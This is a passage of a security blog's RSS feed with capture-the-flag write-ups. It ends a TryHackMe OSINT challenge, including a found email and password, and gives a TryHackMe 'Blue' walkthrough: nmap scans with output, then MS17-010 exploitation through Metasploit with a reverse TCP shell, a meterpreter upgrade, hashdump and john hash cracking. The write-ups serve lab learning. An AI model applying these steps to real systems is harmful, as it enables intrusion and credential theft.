<span style="color:#a6e22e">Ans</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">UnileverWifi</span>
</code></pre></div><p>Now back to Google results, there is a GitHub with a Readme file:</p>
<p>
    <img src="/images/OhSINT/Untitled%207.png"  class="center"  style="border-radius: 10px;"  />


We could find the answer to question 4 and 5.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-jsx" data-lang="jsx"><span style="color:#a6e22e">Q4</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">What</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">his</span> <span style="color:#a6e22e">personal</span> <span style="color:#a6e22e">email</span> <span style="color:#a6e22e">address</span><span style="color:#f92672">?</span>
<span style="color:#a6e22e">Ans</span> <span style="color:#f92672">:</span>  <span style="color:#a6e22e">OWoodflint</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">gmail</span>.<span style="color:#a6e22e">com</span>

<span style="color:#a6e22e">Q5</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">What</span> <span style="color:#a6e22e">site</span> <span style="color:#a6e22e">did</span> <span style="color:#a6e22e">you</span> <span style="color:#a6e22e">find</span> <span style="color:#a6e22e">his</span> <span style="color:#a6e22e">email</span> <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">on</span> <span style="color:#f92672">?</span>
<span style="color:#a6e22e">Ans</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">github</span>
</code></pre></div><p>Finally there’s also a wordpress blog in google results. Visting that we see he posted on 3rd March 2019 that he is in New York. As he lives in London, we can assume he was on vacation.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-jsx" data-lang="jsx"><span style="color:#a6e22e">Q6</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">Where</span> <span style="color:#a6e22e">has</span> <span style="color:#a6e22e">he</span> <span style="color:#a6e22e">gone</span> <span style="color:#a6e22e">on</span> <span style="color:#a6e22e">holiday</span><span style="color:#f92672">?</span>
<span style="color:#a6e22e">Ans</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">New</span> <span style="color:#a6e22e">York</span>
</code></pre></div><p>I was looking for this answer on google results and I also check Have I been pwnd with no luck, but after select the text I could found a possible password:

    <img src="/images/OhSINT/Untitled%208.png"  class="center"  style="border-radius: 10px;"  />

</p>
<p>It was hidden, you could also found it on the pages sources:

    <img src="/images/OhSINT/Untitled%209.png"  class="center"  style="border-radius: 10px;"  />

</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-jsx" data-lang="jsx"><span style="color:#a6e22e">Q6</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">Where</span> <span style="color:#a6e22e">has</span> <span style="color:#a6e22e">he</span> <span style="color:#a6e22e">gone</span> <span style="color:#a6e22e">on</span> <span style="color:#a6e22e">holiday</span><span style="color:#f92672">?</span>
<span style="color:#a6e22e">Ans</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">pennYDr0pper</span>.<span style="color:#f92672">!</span>
</code></pre></div>
    <img src="/images/OhSINT/Untitled%2010.png"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>TryHackme - Blue - Write Up</title>
            <link>https://nmmorette.github.io/posts/2022/08/tryhackme-blue-write-up/</link>
            <pubDate>Mon, 15 Aug 2022 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2022/08/tryhackme-blue-write-up/</guid>
            <description>Blue Enumeration Initiated the first scan using nmap: The scan results:
sudo nmap -PA 10.10.248.155 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-10 19:48 EDT Nmap scan report for 10.10.248.155 Host is up (0.25s latency). Not shown: 991 closed tcp ports (reset) PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49158/tcp open unknown 49160/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 8.</description>
            <content type="html"><![CDATA[<h1 id="blue">Blue</h1>

    <img src="/images/tryhackme/Blue/Untitled.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="enumeration">Enumeration</h2>
<p>Initiated the first scan using nmap:
The scan results:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-jsx" data-lang="jsx"><span style="color:#a6e22e">sudo</span> <span style="color:#a6e22e">nmap</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">PA</span>  <span style="color:#ae81ff">10.10.248.155</span>
<span style="color:#a6e22e">Starting</span> <span style="color:#a6e22e">Nmap</span> <span style="color:#ae81ff">7.94</span> ( <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//nmap.org ) at 2023-10-10 19:48 EDT
</span><span style="color:#75715e"></span><span style="color:#a6e22e">Nmap</span> <span style="color:#a6e22e">scan</span> <span style="color:#a6e22e">report</span> <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">10.10.248.155</span>
<span style="color:#a6e22e">Host</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">up</span> (<span style="color:#ae81ff">0.25</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">latency</span>).
<span style="color:#a6e22e">Not</span> <span style="color:#a6e22e">shown</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">991</span> <span style="color:#a6e22e">closed</span> <span style="color:#a6e22e">tcp</span> <span style="color:#a6e22e">ports</span> (<span style="color:#a6e22e">reset</span>)
<span style="color:#a6e22e">PORT</span>      <span style="color:#a6e22e">STATE</span> <span style="color:#a6e22e">SERVICE</span>
<span style="color:#ae81ff">135</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span>   <span style="color:#a6e22e">open</span>  <span style="color:#a6e22e">msrpc</span>
<span style="color:#ae81ff">139</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span>   <span style="color:#a6e22e">open</span>  <span style="color:#a6e22e">netbios</span><span style="color:#f92672">-</span><span style="color:#a6e22e">ssn</span>
<span style="color:#ae81ff">445</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span>   <span style="color:#a6e22e">open</span>  <span style="color:#a6e22e">microsoft</span><span style="color:#f92672">-</span><span style="color:#a6e22e">ds</span>
<span style="color:#ae81ff">3389</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span>  <span style="color:#a6e22e">open</span>  <span style="color:#a6e22e">ms</span><span style="color:#f92672">-</span><span style="color:#a6e22e">wbt</span><span style="color:#f92672">-</span><span style="color:#a6e22e">server</span>
<span style="color:#ae81ff">49152</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span> <span style="color:#a6e22e">open</span>  <span style="color:#a6e22e">unknown</span>
<span style="color:#ae81ff">49153</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span> <span style="color:#a6e22e">open</span>  <span style="color:#a6e22e">unknown</span>
<span style="color:#ae81ff">49154</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span> <span style="color:#a6e22e">open</span>  <span style="color:#a6e22e">unknown</span>
<span style="color:#ae81ff">49158</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span> <span style="color:#a6e22e">open</span>  <span style="color:#a6e22e">unknown</span>
<span style="color:#ae81ff">49160</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span> <span style="color:#a6e22e">open</span>  <span style="color:#a6e22e">unknown</span>

<span style="color:#a6e22e">Nmap</span> <span style="color:#a6e22e">done</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">IP</span> <span style="color:#a6e22e">address</span> (<span style="color:#ae81ff">1</span> <span style="color:#a6e22e">host</span> <span style="color:#a6e22e">up</span>) <span style="color:#a6e22e">scanned</span> <span style="color:#66d9ef">in</span> <span style="color:#ae81ff">8.10</span> <span style="color:#a6e22e">seconds</span>
</code></pre></div><p>Next, I performed an aggressive scan on the open ports:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-jsx" data-lang="jsx"><span style="color:#a6e22e">sudo</span> <span style="color:#a6e22e">nmap</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">sS</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">A</span> <span style="color:#ae81ff">10.10.248.155</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">p</span> <span style="color:#ae81ff">135</span>,<span style="color:#ae81ff">139</span>,<span style="color:#ae81ff">445</span>,<span style="color:#ae81ff">3389</span> 
<span style="color:#a6e22e">Starting</span> <span style="color:#a6e22e">Nmap</span> <span style="color:#ae81ff">7.94</span> ( <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//nmap.org ) at 2023-10-10 19:50 EDT
</span><span style="color:#75715e"></span><span style="color:#a6e22e">Nmap</span> <span style="color:#a6e22e">scan</span> <span style="color:#a6e22e">report</span> <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">10.10.248.155</span>
<span style="color:#a6e22e">Host</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">up</span> (<span style="color:#ae81ff">0.31</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">latency</span>).

<span style="color:#a6e22e">PORT</span>     <span style="color:#a6e22e">STATE</span> <span style="color:#a6e22e">SERVICE</span>     <span style="color:#a6e22e">VERSION</span>
<span style="color:#ae81ff">135</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span>  <span style="color:#a6e22e">open</span>  <span style="color:#a6e22e">msrpc</span>       <span style="color:#a6e22e">Microsoft</span> <span style="color:#a6e22e">Windows</span> <span style="color:#a6e22e">RPC</span>
<span style="color:#ae81ff">139</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span>  <span style="color:#a6e22e">open</span>  <span style="color:#a6e22e">netbios</span><span style="color:#f92672">-</span><span style="color:#a6e22e">ssn</span> <span style="color:#a6e22e">Microsoft</span> <span style="color:#a6e22e">Windows</span> <span style="color:#a6e22e">netbios</span><span style="color:#f92672">-</span><span style="color:#a6e22e">ssn</span>
<span style="color:#ae81ff">445</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span>  <span style="color:#a6e22e">open</span>  <span style="color:#960050;background-color:#1e0010">��</span><span style="color:#a6e22e">Iv</span>.<span style="color:#a6e22e">V</span>      <span style="color:#a6e22e">Windows</span> <span style="color:#ae81ff">7</span> <span style="color:#a6e22e">Professional</span> <span style="color:#ae81ff">7601</span> <span style="color:#a6e22e">Service</span> <span style="color:#a6e22e">Pack</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">microsoft</span><span style="color:#f92672">-</span><span style="color:#a6e22e">ds</span> (<span style="color:#a6e22e">workgroup</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">WORKGROUP</span>)
<span style="color:#ae81ff">3389</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span> <span style="color:#a6e22e">open</span>  <span style="color:#a6e22e">tcpwrapped</span>
<span style="color:#f92672">|</span><span style="color:#a6e22e">_ssl</span><span style="color:#f92672">-</span><span style="color:#a6e22e">date</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2023</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span><span style="color:#a6e22e">T23</span><span style="color:#f92672">:</span><span style="color:#ae81ff">50</span><span style="color:#f92672">:</span><span style="color:#ae81ff">37</span><span style="color:#f92672">+</span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span>; <span style="color:#ae81ff">0</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">from</span> <span style="color:#a6e22e">scanner</span> <span style="color:#a6e22e">time</span>.
<span style="color:#f92672">|</span> <span style="color:#a6e22e">ssl</span><span style="color:#f92672">-</span><span style="color:#a6e22e">cert</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Subject</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">commonName</span><span style="color:#f92672">=</span><span style="color:#a6e22e">Jon</span><span style="color:#f92672">-</span><span style="color:#a6e22e">PC</span>
<span style="color:#f92672">|</span> <span style="color:#a6e22e">Not</span> <span style="color:#a6e22e">valid</span> <span style="color:#a6e22e">before</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2023</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span><span style="color:#f92672">-</span><span style="color:#ae81ff">09</span><span style="color:#a6e22e">T23</span><span style="color:#f92672">:</span><span style="color:#ae81ff">45</span><span style="color:#f92672">:</span><span style="color:#ae81ff">07</span>
<span style="color:#f92672">|</span><span style="color:#a6e22e">_Not</span> <span style="color:#a6e22e">valid</span> <span style="color:#a6e22e">after</span><span style="color:#f92672">:</span>  <span style="color:#ae81ff">2024</span><span style="color:#f92672">-</span><span style="color:#ae81ff">04</span><span style="color:#f92672">-</span><span style="color:#ae81ff">09</span><span style="color:#a6e22e">T23</span><span style="color:#f92672">:</span><span style="color:#ae81ff">45</span><span style="color:#f92672">:</span><span style="color:#ae81ff">07</span>
<span style="color:#a6e22e">Warning</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">OSScan</span> <span style="color:#a6e22e">results</span> <span style="color:#a6e22e">may</span> <span style="color:#a6e22e">be</span> <span style="color:#a6e22e">unreliable</span> <span style="color:#a6e22e">because</span> <span style="color:#a6e22e">we</span> <span style="color:#a6e22e">could</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">find</span> <span style="color:#a6e22e">at</span> <span style="color:#a6e22e">least</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">open</span> <span style="color:#a6e22e">and</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">closed</span> <span style="color:#a6e22e">port</span>
<span style="color:#a6e22e">Aggressive</span> <span style="color:#a6e22e">OS</span> <span style="color:#a6e22e">guesses</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Microsoft</span> <span style="color:#a6e22e">Windows</span> <span style="color:#ae81ff">7</span> <span style="color:#a6e22e">or</span> <span style="color:#a6e22e">Windows</span> <span style="color:#a6e22e">Server</span> <span style="color:#ae81ff">2008</span> <span style="color:#a6e22e">R2</span> (<span style="color:#ae81ff">97</span><span style="color:#f92672">%</span>), <span style="color:#a6e22e">Microsoft</span> <span style="color:#a6e22e">Windows</span> <span style="color:#a6e22e">Server</span> <span style="color:#ae81ff">2008</span> <span style="color:#a6e22e">R2</span> <span style="color:#a6e22e">SP1</span> (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>), <span style="color:#a6e22e">Microsoft</span> <span style="color:#a6e22e">Windows</span> <span style="color:#a6e22e">Server</span> <span style="color:#ae81ff">2008</span> <span style="color:#a6e22e">SP1</span> (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>), <span style="color:#a6e22e">Microsoft</span> <span style="color:#a6e22e">Windows</span> <span style="color:#a6e22e">Server</span> <span style="color:#ae81ff">2008</span> <span style="color:#a6e22e">SP2</span> (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>), <span style="color:#a6e22e">Microsoft</span> <span style="color:#a6e22e">Windows</span> <span style="color:#a6e22e">Server</span> <span style="color:#ae81ff">2008</span> <span style="color:#a6e22e">SP2</span> <span style="color:#a6e22e">or</span> <span style="color:#a6e22e">Windows</span> <span style="color:#ae81ff">10</span> <span style="color:#a6e22e">or</span> <span style="color:#a6e22e">Xbox</span> <span style="color:#a6e22e">One</span> (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>), <span style="color:#a6e22e">Microsoft</span> <span style="color:#a6e22e">Windows</span> <span style="color:#ae81ff">7</span> (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>), <span style="color:#a6e22e">Microsoft</span> <span style="color:#a6e22e">Windows</span> <span style="color:#ae81ff">7</span> <span style="color:#a6e22e">SP0</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">SP1</span> <span style="color:#a6e22e">or</span> <span style="color:#a6e22e">Windows</span> <span style="color:#a6e22e">Server</span> <span style="color:#ae81ff">2008</span> (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>), <span style="color:#a6e22e">Microsoft</span> <span style="color:#a6e22e">Windows</span> <span style="color:#ae81ff">7</span> <span style="color:#a6e22e">SP0</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">SP1</span>, <span style="color:#a6e22e">Windows</span> <span style="color:#a6e22e">Server</span> <span style="color:#ae81ff">2008</span> <span style="color:#a6e22e">SP1</span>, <span style="color:#a6e22e">Windows</span> <span style="color:#a6e22e">Server</span> <span style="color:#ae81ff">2008</span> <span style="color:#a6e22e">R2</span>, <span style="color:#a6e22e">Windows</span> <span style="color:#ae81ff">8</span>, <span style="color:#a6e22e">or</span> <span style="color:#a6e22e">Windows</span> <span style="color:#ae81ff">8.1</span> <span style="color:#a6e22e">Update</span> <span style="color:#ae81ff">1</span> (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>), <span style="color:#a6e22e">Microsoft</span> <span style="color:#a6e22e">Windows</span> <span style="color:#ae81ff">7</span> <span style="color:#a6e22e">SP1</span> (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>), <span style="color:#a6e22e">Microsoft</span> <span style="color:#a6e22e">Windows</span> <span style="color:#ae81ff">7</span> <span style="color:#a6e22e">Ultimate</span> (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>)
<span style="color:#a6e22e">No</span> <span style="color:#a6e22e">exact</span> <span style="color:#a6e22e">OS</span> <span style="color:#a6e22e">matches</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">host</span> (<span style="color:#a6e22e">test</span> <span style="color:#a6e22e">conditions</span> <span style="color:#a6e22e">non</span><span style="color:#f92672">-</span><span style="color:#a6e22e">ideal</span>).
<span style="color:#a6e22e">Network</span> <span style="color:#a6e22e">Distance</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">4</span> <span style="color:#a6e22e">hops</span>
<span style="color:#a6e22e">Service</span> <span style="color:#a6e22e">Info</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JON</span><span style="color:#f92672">-</span><span style="color:#a6e22e">PC</span>; <span style="color:#a6e22e">OS</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Windows</span>; <span style="color:#a6e22e">CPE</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">cpe</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">/o:microsoft:windows</span>

<span style="color:#a6e22e">Host</span> <span style="color:#a6e22e">script</span> <span style="color:#a6e22e">results</span><span style="color:#f92672">:</span>
<span style="color:#f92672">|</span> <span style="color:#a6e22e">smb</span><span style="color:#f92672">-</span><span style="color:#a6e22e">security</span><span style="color:#f92672">-</span><span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> 
<span style="color:#f92672">|</span>   <span style="color:#a6e22e">account_used</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">guest</span>
<span style="color:#f92672">|</span>   <span style="color:#a6e22e">authentication_level</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">user</span>
<span style="color:#f92672">|</span>   <span style="color:#a6e22e">challenge_response</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">supported</span>
<span style="color:#f92672">|</span><span style="color:#a6e22e">_</span>  <span style="color:#a6e22e">message_signing</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">disabled</span> (<span style="color:#a6e22e">dangerous</span>, <span style="color:#a6e22e">but</span> <span style="color:#66d9ef">default</span>)
<span style="color:#f92672">|</span> <span style="color:#a6e22e">smb2</span><span style="color:#f92672">-</span><span style="color:#a6e22e">time</span><span style="color:#f92672">:</span> 
<span style="color:#f92672">|</span>   <span style="color:#a6e22e">date</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2023</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span><span style="color:#a6e22e">T23</span><span style="color:#f92672">:</span><span style="color:#ae81ff">50</span><span style="color:#f92672">:</span><span style="color:#ae81ff">27</span>
<span style="color:#f92672">|</span><span style="color:#a6e22e">_</span>  <span style="color:#a6e22e">start_date</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2023</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span><span style="color:#a6e22e">T23</span><span style="color:#f92672">:</span><span style="color:#ae81ff">45</span><span style="color:#f92672">:</span><span style="color:#ae81ff">06</span>
<span style="color:#f92672">|</span><span style="color:#a6e22e">_nbstat</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">NetBIOS</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JON</span><span style="color:#f92672">-</span><span style="color:#a6e22e">PC</span>, <span style="color:#a6e22e">NetBIOS</span> <span style="color:#a6e22e">user</span><span style="color:#f92672">:</span> &lt;<span style="color:#f92672">unknown</span>&gt;, <span style="color:#a6e22e">NetBIOS</span> <span style="color:#a6e22e">MAC</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">02</span><span style="color:#f92672">:</span><span style="color:#a6e22e">f7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">04</span><span style="color:#f92672">:</span><span style="color:#ae81ff">20</span><span style="color:#f92672">:</span><span style="color:#a6e22e">d4</span><span style="color:#f92672">:</span><span style="color:#ae81ff">37</span> (<span style="color:#a6e22e">unknown</span>)
<span style="color:#f92672">|</span> <span style="color:#a6e22e">smb</span><span style="color:#f92672">-</span><span style="color:#a6e22e">os</span><span style="color:#f92672">-</span><span style="color:#a6e22e">discovery</span><span style="color:#f92672">:</span> 
<span style="color:#f92672">|</span>   <span style="color:#a6e22e">OS</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Windows</span> <span style="color:#ae81ff">7</span> <span style="color:#a6e22e">Professional</span> <span style="color:#ae81ff">7601</span> <span style="color:#a6e22e">Service</span> <span style="color:#a6e22e">Pack</span> <span style="color:#ae81ff">1</span> (<span style="color:#a6e22e">Windows</span> <span style="color:#ae81ff">7</span> <span style="color:#a6e22e">Professional</span> <span style="color:#ae81ff">6.1</span>)
<span style="color:#f92672">|</span>   <span style="color:#a6e22e">OS</span> <span style="color:#a6e22e">CPE</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">cpe</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">/o:microsoft:windows_7::sp1:professional</span>
<span style="color:#f92672">|</span>   <span style="color:#a6e22e">Computer</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Jon</span><span style="color:#f92672">-</span><span style="color:#a6e22e">PC</span>
<span style="color:#f92672">|</span>   <span style="color:#a6e22e">NetBIOS</span> <span style="color:#a6e22e">computer</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JON</span><span style="color:#f92672">-</span><span style="color:#a6e22e">PC</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x00</span>
<span style="color:#f92672">|</span>   <span style="color:#a6e22e">Workgroup</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">WORKGROUP</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x00</span>
<span style="color:#f92672">|</span><span style="color:#a6e22e">_</span>  <span style="color:#a6e22e">System</span> <span style="color:#a6e22e">time</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2023</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span><span style="color:#a6e22e">T18</span><span style="color:#f92672">:</span><span style="color:#ae81ff">50</span><span style="color:#f92672">:</span><span style="color:#ae81ff">27</span><span style="color:#f92672">-</span><span style="color:#ae81ff">05</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span>
<span style="color:#f92672">|</span><span style="color:#a6e22e">_clock</span><span style="color:#f92672">-</span><span style="color:#a6e22e">skew</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">mean</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span><span style="color:#a6e22e">h15m00s</span>, <span style="color:#a6e22e">deviation</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span><span style="color:#a6e22e">h30m00s</span>, <span style="color:#a6e22e">median</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">s</span>
<span style="color:#f92672">|</span> <span style="color:#a6e22e">smb2</span><span style="color:#f92672">-</span><span style="color:#a6e22e">security</span><span style="color:#f92672">-</span><span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> 
<span style="color:#f92672">|</span>   <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> 
<span style="color:#f92672">|</span><span style="color:#a6e22e">_</span>    <span style="color:#a6e22e">Message</span> <span style="color:#a6e22e">signing</span> <span style="color:#a6e22e">enabled</span> <span style="color:#a6e22e">but</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">required</span>

<span style="color:#a6e22e">TRACEROUTE</span> (<span style="color:#a6e22e">using</span> <span style="color:#a6e22e">port</span> <span style="color:#ae81ff">80</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span>)
<span style="color:#a6e22e">HOP</span> <span style="color:#a6e22e">RTT</span>       <span style="color:#a6e22e">ADDRESS</span>
<span style="color:#ae81ff">1</span>   <span style="color:#ae81ff">684.42</span> <span style="color:#a6e22e">ms</span> <span style="color:#ae81ff">10.6.0.1</span>
<span style="color:#ae81ff">2</span>   ... <span style="color:#ae81ff">3</span>
<span style="color:#ae81ff">4</span>   <span style="color:#ae81ff">684.56</span> <span style="color:#a6e22e">ms</span> <span style="color:#ae81ff">10.10.248.155</span>

<span style="color:#a6e22e">OS</span> <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">Service</span> <span style="color:#a6e22e">detection</span> <span style="color:#a6e22e">performed</span>. <span style="color:#a6e22e">Please</span> <span style="color:#a6e22e">report</span> <span style="color:#a6e22e">any</span> <span style="color:#a6e22e">incorrect</span> <span style="color:#a6e22e">results</span> <span style="color:#a6e22e">at</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//nmap.org/submit/ .
</span><span style="color:#75715e"></span><span style="color:#a6e22e">Nmap</span> <span style="color:#a6e22e">done</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">IP</span> <span style="color:#a6e22e">address</span> (<span style="color:#ae81ff">1</span> <span style="color:#a6e22e">host</span> <span style="color:#a6e22e">up</span>) <span style="color:#a6e22e">scanned</span> <span style="color:#66d9ef">in</span> <span style="color:#ae81ff">36.23</span> <span style="color:#a6e22e">seconds</span>
                                                                                                                          
</code></pre></div><h2 id="vuln-scan">Vuln Scan</h2>
<p>Executed nmap once more with the &ndash;script vuln option targeting open port</p>

    <img src="/images/tryhackme/Blue/Untitled%201.png"  class="center"  style="border-radius: 10px;"  />


<p>The machine is confirmed to be vulnerable to ms17-010.</p>
<h2 id="exploitation">Exploitation</h2>
<h3 id="search-exploit">Search Exploit</h3>
<p>I launched <code>msfconsole</code>  and searched for the ms17-010 exploit:</p>

    <img src="/images/tryhackme/Blue/Untitled%202.png"  class="center"  style="border-radius: 10px;"  />


<p>After configuring <code>RHOSTS</code>, <code>LHOSTS</code> , and setting the payload to <code>windows/x64/shell/reverse_tcp</code>, I initiated the exploit:</p>

    <img src="/images/tryhackme/Blue/Untitled%203.png"  class="center"  style="border-radius: 10px;"  />


<p>With access to the shell, I then proceeded to upgrade this shell to a meterpreter shell. After backgrounding the session using <code>CTRL + Z</code>, I looked up the <code>shell_to_meterpreter</code> module and set it up:</p>

    <img src="/images/tryhackme/Blue/Untitled%204.png"  class="center"  style="border-radius: 10px;"  />


<p>Upon successful migration, I obtained a meterpreter session:</p>

    <img src="/images/tryhackme/Blue/Untitled%205.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="hash-extration">Hash Extration</h2>
<p>Since I already had a session with NT AUTHORITY\SYSTEM privileges, I proceeded to use <code>hasdump</code>:</p>

    <img src="/images/tryhackme/Blue/Untitled%206.png"  class="center"  style="border-radius: 10px;"  />


<p>I then used <code>john</code> to crack the extracted password hashes:</p>
<h2 id="flag-recovery">Flag Recovery</h2>

    <img src="/images/tryhackme/Blue/Untitled%207.png"  class="center"  style="border-radius: 10px;"  />


<ul>
<li>Located in <code>C:\</code></li>
<li>Located in <code>C:\Windows\System32\config</code></li>
<li>Located in <code>C:\Users\Jon\Documents</code></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Hack the Box - Forest - Write Up</title>
            <link>https://nmmorette.github.io/posts/2022/06/hack-the-box-forest-write-up/</link>
            <pubDate>Sun, 12 Jun 2022 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2022/06/hack-the-box-forest-write-up/</guid>
            <description>Forest Enumeration nmap Initian enumeration with nmap
Some usefull information:
